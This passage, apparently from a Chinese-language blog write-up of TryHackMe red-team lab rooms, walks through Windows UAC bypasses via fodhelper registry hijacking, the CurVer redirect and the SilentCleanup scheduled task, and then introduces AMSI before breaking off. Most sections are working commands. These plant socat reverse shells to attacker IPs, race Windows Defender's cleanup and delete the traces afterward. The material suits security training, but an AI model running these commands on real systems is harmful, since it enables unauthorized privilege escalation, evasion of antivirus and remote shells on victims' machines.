title="实践"></a>实践</h4><p>这个房间给的主机已经埋了一个后门，我们用 nc 连进去：</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">nc </span><span style="color: #D19A66">10.201.63.248</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">9999</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 查看当前的 IL</span></span><span class="line"><span style="color: #ABB2BF">C:\</span><span style="color: #E06C75">Windows</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">system32</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">whoami</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">groups</span><span style="color: #ABB2BF"> | find </span><span style="color: #98C379">&quot;Label&quot;</span></span><span class="line"><span style="color: #ABB2BF">Mandatory </span><span style="color: #E06C75">Label</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Medium</span><span style="color: #ABB2BF"> Mandatory Level                        Label            </span><span style="color: #E06C75">S</span><span style="color: #D19A66">-1-16-8192</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 指定要修改的注册表</span></span><span class="line"><span style="color: #C678DD">set </span><span style="color: #E06C75">REG_KEY</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">HKCU</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Software</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Classes</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">ms</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">settings</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Shell</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Open</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">command</span></span><span class="line"><span style="color: #ABB2BF"># 要执行的命令</span></span><span class="line"><span style="color: #C678DD">set </span><span style="color: #E06C75">CMD</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.141.2:4444 EXEC:cmd.exe,pipes&quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 禁用默认的执行委托</span></span><span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> %REG_KEY% /</span><span style="color: #E06C75">v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;DelegateExecute&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span><span class="line"><span style="color: #ABB2BF"># 新建一个键 内容是我们要执行的命令</span></span><span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> %REG_KEY% /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> %CMD% /</span><span style="color: #E06C75">f</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 执行 fodhelper 就拿到 High IL 的 Shell 了</span></span><span class="line"><span style="color: #ABB2BF">fodhelper.exe</span></span></code></pre></div></div></figure><p>实际上你通过观察注册表会发现，HKCU 下的 ms-settings 是没有任何东西的，但是 fodhelper.exe 会优先检索 HKCU 下的 <code>\Software\Classes\ms-settings\Shell\Open\command</code>。我们通过把他的执行命令改了，弹一个 shell 回我们的机器，因为他是用高权限执行的，所以拿到的也是 High IL。</p><img src="/thm_rthe/image-20250827183247541.png" class="" title="image-20250827183247541"><p>如果你只修改 <code>command</code> 键，而不去动 <code>DelegateExecute</code>，你的攻击链就会<strong>失败</strong>。这是因为 <code>DelegateExecute</code> 的优先级更高。</p><p>Windows 在处理 <code>ms-settings</code> 协议时，遵循一个严格的优先级：</p><ol><li>**首先检查 <code>DelegateExecute</code>**：操作系统或 <code>fodhelper.exe</code> 进程会首先检查 <code>command</code> 键下是否存在 <code>DelegateExecute</code> 这个值。</li><li><strong>执行委托</strong>：如果 <code>DelegateExecute</code> 存在且包含有效数据，它就会<strong>立即</strong>将执行权委托给该值所指向的程序。此时，<code>command</code> 键下设置的任何命令都会被<strong>完全忽略</strong>，即使你填入了恶意代码，它也不会被执行。</li><li><strong>退回执行</strong>：只有当 <code>DelegateExecute</code> 不存在或其值为<strong>空字符串</strong>时，操作系统才会“退回”并执行 <code>command</code> 键下的命令。</li></ol><h5 id="清理痕迹"><a href="#清理痕迹" class="headerlink" title="清理痕迹"></a>清理痕迹</h5><p>用这一行命令删掉我们在 HKCU 下写的注册表就行了，系统会回去调用 HKLM 的项。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">reg delete </span><span style="color: #E06C75">HKCU</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Software</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Classes</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">ms</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">settings</span><span style="color: #ABB2BF">\ /</span><span style="color: #E06C75">f</span></span></code></pre></div></div></figure><h5 id="绕过-WD"><a href="#绕过-WD" class="headerlink" title="绕过 WD"></a>绕过 WD</h5><p>刚刚是在 WD 关掉的情况下操作的，所以问题不大，那如果 WD 打开的话，在插入  <code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code> 的时候就会报毒了</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">set </span><span style="color: #E06C75">REG_KEY</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">HKCU</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Software</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Classes</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">ms</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">settings</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Shell</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Open</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">command</span></span><span class="line"><span style="color: #C678DD">set </span><span style="color: #E06C75">CMD</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.141.2:4444 EXEC:cmd.exe,pipes&quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> %REG_KEY% /</span><span style="color: #E06C75">v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;DelegateExecute&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span><span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> %REG_KEY% /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> %CMD% /</span><span style="color: #E06C75">f</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 查看被删除的注册表</span></span><span class="line"><span style="color: #ABB2BF">reg query %REG_KEY% /</span><span style="color: #E06C75">v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span></code></pre></div></div></figure><p>不过这里可以发现 WD 删除注册表是要时间的，如果我们在写入注册表之后马上执行，那么一样能拿到 shell。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> %REG_KEY% /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> %CMD% /</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF"> &amp; fodhelper.exe</span></span></code></pre></div></div></figure><h4 id="利用-CurVer-劫持-UAC"><a href="#利用-CurVer-劫持-UAC" class="headerlink" title="利用 CurVer 劫持 UAC"></a>利用 CurVer 劫持 UAC</h4><p><a href="https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses">@V3ded</a> 提出了一种对 fodhelper 漏洞利用的变种，使用了不同的注册表键，但基本原理相同。</p><p>这个复杂的 UAC 绕过技术不再直接修改 <code>ms-settings</code> 的命令键，而是利用了一个更为隐蔽的机制：**<code>ProgID</code> 的 <code>CurVer</code> 条目**。</p><p><strong>攻击原理：利用版本重定向</strong></p><p><code>CurVer</code>（Current Version，当前版本）是 Windows 设计用来在系统中管理同一应用的多个不同版本时使用的。它允许一个 <code>ProgID</code> 指向应用的最新或默认版本。当 Windows 需要打开一个文件或执行某个协议时，它会首先检查 <code>CurVer</code> 条目，然后根据该条目的指引去寻找实际的执行命令。</p><p>攻击者正是利用了这个重定向功能来**欺骗 <code>fodhelper.exe</code>**。</p><p><strong>攻击步骤</strong></p><ol><li><strong>设置陷阱</strong>：攻击者首先在注册表中创建一个**全新的 <code>ProgID</code>**（可以随意命名）。这个新的 <code>ProgID</code> 包含了攻击者的恶意命令。</li><li><strong>制造重定向</strong>：然后，攻击者将合法的 <code>ms-settings</code> <code>ProgID</code> 的 <code>CurVer</code> 条目<strong>修改</strong>为指向这个新创建的 <code>ProgID</code>。</li><li><strong>触发执行</strong>：当 <code>fodhelper.exe</code> 运行时，它会像往常一样，通过 <code>ms-settings</code> <code>ProgID</code> 来寻找要执行的命令。但这次，它会首先遇到 <code>CurVer</code> 条目，并被<strong>重定向</strong>到我们伪造的 <code>ProgID</code>。</li><li><strong>执行恶意代码</strong>：最终，<code>fodhelper.exe</code> 会检查我们这个新 <code>ProgID</code> 的配置，并<strong>在完全没有 UAC 提示的情况下，执行我们预先设置好的恶意命令</strong>。</li></ol><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$program</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.6.4.118:4445 EXEC:cmd.exe,pipes&quot;</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">New-Item</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HKCU:\Software\Classes\.pwn\Shell\Open\command&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force</span></span><span class="line"><span style="color: #56B6C2">Set-ItemProperty</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HKCU:\Software\Classes\.pwn\Shell\Open\command&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;(default)&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Value </span><span style="color: #E06C75">$program</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force</span></span><span class="line"><span style="color: #ABB2BF">    </span></span><span class="line"><span style="color: #56B6C2">New-Item</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path </span><span style="color: #98C379">&quot;HKCU:\Software\Classes\ms-settings\CurVer&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force</span></span><span class="line"><span style="color: #56B6C2">Set-ItemProperty</span><span style="color: #ABB2BF">  </span><span style="color: #98C379">&quot;HKCU:\Software\Classes\ms-settings\CurVer&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;(default)&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">value </span><span style="color: #98C379">&quot;.pwn&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force</span></span><span class="line"><span style="color: #56B6C2">Start-Process</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;C:\Windows\System32\fodhelper.exe&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">WindowStyle </span><span style="color: #C678DD">Hidden</span></span></code></pre></div></div></figure><p>用 PowerShell 执行会报毒，但是 cmd 不会，因为杀毒软件采用的检测方法是严格针对已公开的利用方式实现的。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">set </span><span style="color: #E06C75">CMD</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.6.4.118:4445 EXEC:cmd.exe,pipes&quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HKCU\Software\Classes\.thm\Shell\Open\command&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> %CMD% /</span><span style="color: #E06C75">f</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HKCU\Software\Classes\ms-settings\CurVer&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;.thm&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">fodhelper.exe</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 清理痕迹</span></span><span class="line"><span style="color: #ABB2BF">reg delete </span><span style="color: #98C379">&quot;HKCU\Software\Classes\.thm\&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span><span class="line"><span style="color: #ABB2BF">reg delete </span><span style="color: #98C379">&quot;HKCU\Software\Classes\ms-settings\&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span></code></pre></div></div></figure><h2 id="绕过最高级的-UAC"><a href="#绕过最高级的-UAC" class="headerlink" title="绕过最高级的 UAC"></a>绕过最高级的 UAC</h2><p>在默认的 Windows 配置下，你可以滥用与系统配置相关的应用程序来绕过 UAC，因为这些应用的大多数在其清单中设置了 autoElevate 标志。然而，如果 UAC 被配置为“始终通知”级别，它们在提升权限时会要求用户通过 UAC 提示，无法绕过。</p><p>但是并不是没有办法，可以使用计划任务绕过这点限制，任何需要提升权限的计划任务都会自动获得提升。</p><h3 id="案例研究：磁盘清理计划任务"><a href="#案例研究：磁盘清理计划任务" class="headerlink" title="案例研究：磁盘清理计划任务"></a>案例研究：磁盘清理计划任务</h3><p>在这里我们可以看到该任务被配置为以“Users”帐户运行，这意味着它会继承调用者的权限。“以最高权限运行”选项将使用调用者可用的最高权限安全令牌，对于管理员而言这是一个高完整性级别（IL）的令牌。请注意，如果普通非管理员用户调用此任务，它将只以中等完整性级别（medium IL）执行，因为那是非管理员可用的最高权限令牌，因此绕过将无法生效。</p><img src="/thm_rthe/image-20250827234532455.png" class="" title="image-20250827234532455"><p>查看“操作”和“设置”选项卡，我们得到以下内容：</p><img src="/thm_rthe/3b8dd4c6a441eb19620bc3bedd536a8b.png" class="" title="img"><p>该任务可以按需运行，在调用时执行以下命令：</p><p> <code>%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%</code></p><p>由于该命令依赖于环境变量，我们可以注入命令到这些变量中，并通过手动启动磁盘清理任务使其被执行。</p><p>我们可以通过在注册表中创建一个条目来覆盖 <code>%windir%</code> 变量，路径为 <code>HKCU\Environment</code> 。如果我们想使用 socat 执行反向 shell，可以将 <code>%windir%</code> 设置为如下（不含引号）：</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">cmd.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> C:\</span><span style="color: #E06C75">tools</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">socat</span><span style="color: #ABB2BF">\socat.exe TCP:</span><span style="color: #D19A66">10.6.4.118</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">4445</span><span style="color: #ABB2BF"> EXEC:cmd.exe,</span><span style="color: #E06C75">pipes</span><span style="color: #ABB2BF"> &amp;</span><span style="color: #E06C75">REM</span></span></code></pre></div></div></figure><p>在我们的命令末尾，我们拼接 “&amp;REM “（以空格结尾），以便在展开环境变量时注释掉放在 <code>%windir%</code> 之后的任何内容，从而得到 DiskCleanup 使用的最终命令。最终拼接后生成的命令如下：</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">cmd.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> C:\</span><span style="color: #E06C75">tools</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">socat</span><span style="color: #ABB2BF">\socat.exe TCP:</span><span style="color: #D19A66">10.6.4.118</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">4445</span><span style="color: #ABB2BF"> EXEC:cmd.exe,</span><span style="color: #E06C75">pipes</span><span style="color: #ABB2BF"> &amp;</span><span style="color: #E06C75">REM</span><span style="color: #ABB2BF"> \</span><span style="color: #E06C75">system32</span><span style="color: #ABB2BF">\cleanmgr.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">autoclean</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> %systemdrive%</span></span></code></pre></div></div></figure><p>拿到 shell 之后执行修改注册表的环境变量</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HKCU\Environment&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;windir&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;cmd.exe /c C:\tools\socat\socat.exe TCP:10.6.4.118:4446 EXEC:cmd.exe,pipes &amp;REM &quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 执行计划任务</span></span><span class="line"><span style="color: #E06C75">schtasks</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">run</span><span style="color: #ABB2BF">  /</span><span style="color: #E06C75">tn</span><span style="color: #ABB2BF"> \</span><span style="color: #E06C75">Microsoft</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Windows</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">DiskCleanup</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">SilentCleanup</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">I</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 删除痕迹</span></span><span class="line"><span style="color: #ABB2BF">reg delete </span><span style="color: #98C379">&quot;HKCU\Environment&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;windir&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span></code></pre></div></div></figure><h2 id="自动绕过-UAC"><a href="#自动绕过-UAC" class="headerlink" title="自动绕过 UAC"></a>自动绕过 UAC</h2><p>手动弄了那么多，现在有自动化的方法。<a href="https://github.com/hfiref0x/UACME">UACME</a> 提供了多个工具可以供你测试绕过 UAC。</p><p>这个房间主要专注于名为 Akagi 的那个，使用该工具很简单，只需指出要测试的方法对应的编号即可。</p><p>如果你想测试方法 33，可以在命令提示符中执行以下操作，然后会弹出一个高完整性（high integrity）的 cmd.exe：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">UACME-Akagi64.exe 33</span></span></code></pre></div></div></figure><p>本房间中介绍的方法也可以通过 UACME 使用以下方法进行测试：</p><table><thead><tr><th align="left">Method Id</th><th align="left">Bypass technique</th></tr></thead><tbody><tr><td align="left">33</td><td align="left">fodhelper.exe</td></tr><tr><td align="left">34</td><td align="left">DiskCleanup scheduled task</td></tr><tr><td align="left">70</td><td align="left">fodhelper.exe using CurVer registry key</td></tr></tbody></table><p>测试了挺多的，提供的靶机挺多都可以用，工具的文档也挺详细，就是要自己编译。</p><h2 id="更多资源"><a href="#更多资源" class="headerlink" title="更多资源"></a>更多资源</h2><ul><li><a href="https://github.com/hfiref0x/UACME">UACME github repository</a></li><li><a href="https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/">Bypassing UAC with mock folders and DLL hijacking</a></li><li><a href="https://elastic.github.io/security-research/whitepapers/2022/02/03.exploring-windows-uac-bypass-techniques-detection-strategies/article/">UAC bypass techniques detection strategies</a> </li><li><a href="https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html">Reading your way around UAC</a></li></ul><h1 id="Runtime-Detection-Evasion"><a href="#Runtime-Detection-Evasion" class="headerlink" title="Runtime Detection Evasion"></a>Runtime Detection Evasion</h1><p>这个房间主要是讲绕 AMSI 的，我觉得标题应该取成 Script or PowerShell Runtime Detection Evasion，因为这整个房间都是围绕 PowerShell 的。</p><h2 id="AMSI-概要"><a href="#AMSI-概要" class="headerlink" title="AMSI 概要"></a>AMSI 概要</h2><p>Windows 反恶意软件扫描接口（AMSI）是一种通用的接口标准，允许应用程序和服务与计算机上的任何反恶意软件产品集成。</p><p><a href="https://learn.microsoft.com/en-us/windows/win32/AMSI/antimalware-scan-interface-portal">文档</a></p><p>AMSI 会根据监控或者扫描得到的状态码确定他的行为，下面是可能的状态码：</p><ul><li>AMSI_RESULT_CLEAN &#x3D; 0</li><li>AMSI_RESULT_NOT_DETECTED &#x3D; 1</li><li>AMSI_RESULT_BLOCKED_BY_ADMIN_START &#x3D; 16384</li><li>AMSI_RESULT_BLOCKED_BY_ADMIN_END &#x3D; 20479</li><li>AMSI_RESULT_DETECTED &#x3D; 32768</li></ul><p>这些状态码通过 AMSI 的后端或者第三方的实现才能看到。如果 AMSI 检测出一个威胁的结果，他会停止执行然后发送错误消息。</p><p><strong>下列 Windows 组件集成了 AMSI ：</strong></p><ul><li>User Account Control, or UAC</li><li>PowerShell</li><li>Windows Script Host (wscript and cscript)</li><li>JavaScript and VBScript</li><li>Office VBA macros</li></ul><h2 id="AMSI-插桩"><a href="#AMSI-插桩" class="headerlink" title="AMSI 插桩"></a>AMSI 插桩</h2><p>AMSI 的插桩方式有点复杂，他包含了大量的 DLL ，根据插桩的地方不同，有不同的执行策略。根据定义，AMSI 只是其他反恶意软件产品的一个接口，AMSI 会根据正在执行的内容以及其执行的层级，使用多个提供程序 DLL 和 API 调用。</p><p><code>System.Management.Automation.dll</code>（即 PowerShell 的核心）被 AMSI 所插桩，这是一个由 Windows 开发的 .NET assembly；根据微软文档，“程序集构成了基于 .NET 的应用程序在部署、版本控制、重用、激活范围和安全权限方面的基本单元。”该 .NET assembly 会根据解释器以及代码是在磁盘上还是在内存中，对其他 DLL 和 API 调用进行插桩。下图描述了数据在各层流动时如何被分解以及哪些 DLL&#x2F;API 调用被插装。</p><img src="/thm_rthe/35e16d45ce27145fcdf231fdb8dcb35e.png" class="" title="img"><p>在上图中，数据将根据所使用的解释器（PowerShell&#x2F;VBScript&#x2F;等）进行处理。随着数据在模型各层向下传递，各种 API 调用和接口都会被插桩。理解 AMSI 的完整模型很重要，但我们可以将其拆解为核心组件，如下图所示。</p><img src="/thm_rthe/efca9438e858f0476a4ffd777c36501a.png" class="" title="img"><p>注意：AMSI 只有在代码被通用语言运行时（CLR）在内存中执行时才开始扫描。因为代码如果在硬盘上，WD 就会扫描他，所以 AMSI 是在这个场景下才扫描的。理解成 WD 静态扫描，AMSI 动态扫描就行。</p><p>要查找 PowerShell 被 AMSI 插桩的位置，我们可以使用 Cobbr 维护的 <a href="https://github.com/PowerShell/PowerShell/compare/master...cobbr:master">InsecurePowerShell</a>。InsecurePowerShell 是一个移除安全功能的 PowerShell 的 GitHub 分支，我们可以查看 commit 发现更改的地方。AMSI 仅在 <code>src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs</code> 下的十二行代码中被插桩。这十二行代码如下所示。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">var scriptExtent </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">scriptBlockAst</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">Extent</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">AmsiUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">ScanContent</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">scriptExtent</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">Text</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">scriptExtent</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">File</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">AmsiUtils</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">AmsiNativeMethods</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">AMSI_RESULT</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">AMSI_RESULT_DETECTED</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">  var parseError </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ParseError</span><span style="color: #ABB2BF">(scriptExtent, </span><span style="color: #98C379">&quot;ScriptContainedMaliciousContent&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">ParserStrings</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">ScriptContainedMaliciousContent</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">throw</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ParseException</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF">[] { parseError });</span></span><span class="line"><span style="color: #ABB2BF"> }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">ScriptBlock</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">CheckSuspiciousContent</span><span style="color: #ABB2BF">(scriptBlockAst) </span><span style="color: #C678DD">!=</span><span style="color: #ABB2BF"> null)</span></span><span class="line"><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">  HasSuspiciousContent </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"> }</span></span></code></pre></div></div></figure><h2 id="绕过-AMSI"><a href="#绕过-AMSI" class="headerlink" title="绕过 